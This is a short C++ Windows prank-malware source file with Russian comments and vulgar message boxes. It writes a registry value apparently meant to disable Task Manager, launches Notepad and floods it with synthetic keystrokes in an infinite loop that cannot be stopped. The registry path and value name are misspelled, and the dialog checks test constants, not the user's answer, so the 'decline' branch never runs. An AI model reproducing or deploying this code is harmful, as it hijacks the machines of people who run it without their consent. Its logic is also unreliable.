// Подключаем библиотеки и создаем основные переменные.

#include <windows.h>
#include <iostream>
#include <cstdlib>

#include "Main.h"

void DisEnbMgr(bool v)
{
	RegSetKeyValue(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Polices\\System","DisbaleMgr",REG_DWORD,NULL,v);
}

int WINAPI WinMain(HINSTANCE hint, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

	bool AppRun = true;

	MessageBox(NULL,"Ярик пизда компу блять!","Error!",MB_OK | MB_DEFBUTTON1 |MB_ICONWARNING);
	if(IDOK){
		MessageBox(NULL,"Ну шо, готов сосать?","Помянем",MB_YESNO | MB_DEFBUTTON1 |MB_ICONQUESTION);
	}
	if(IDYES)
	{
		//DisEnbMgr(true);
		Sleep(3000);
	
		system("start C:\\Windows\\system32\\notepad.exe");
 
		int k=0;
		do{
			if (FindWindow(NULL, "Безымянный — Блокнот")!=0 || FindWindow(NULL, "Notepad++")!=0 || FindWindow(NULL, "Microsoft PowerPoint")!=0)
			{
				ShowWindow(FindWindow(NULL, "Безымянный — Блокнот") , SC_MAXIMIZE);
				LoadKeyboardLayout("00000419", KLF_ACTIVATE);
				Sleep(1000);
				do{
					keybd_event('C', 0,0,0);
					keybd_event('C', 0,KEYEVENTF_KEYUP,0);
					keybd_event('F', 0,0,0);
					keybd_event('F', 0,KEYEVENTF_KEYUP,0);
					keybd_event('C', 0,0,0);
					keybd_event('C', 0,KEYEVENTF_KEYUP,0);
					keybd_event('B', 0,0,0);
					keybd_event('B', 0,KEYEVENTF_KEYUP,0);
					keybd_event(VK_SPACE, 0,0,0);
					keybd_event(VK_SPACE, 0,KEYEVENTF_KEYUP,0);
				}while(AppRun);
			}
		}while(AppRun);
	}else{
		MessageBox(NULL,"Ну ок","Ну ладно",MB_OK | MB_DEFBUTTON1 |MB_ICONWARNING);
		DisEnbMgr(false);
		AppRun = false;
		return 0;
	}
	return 0;
}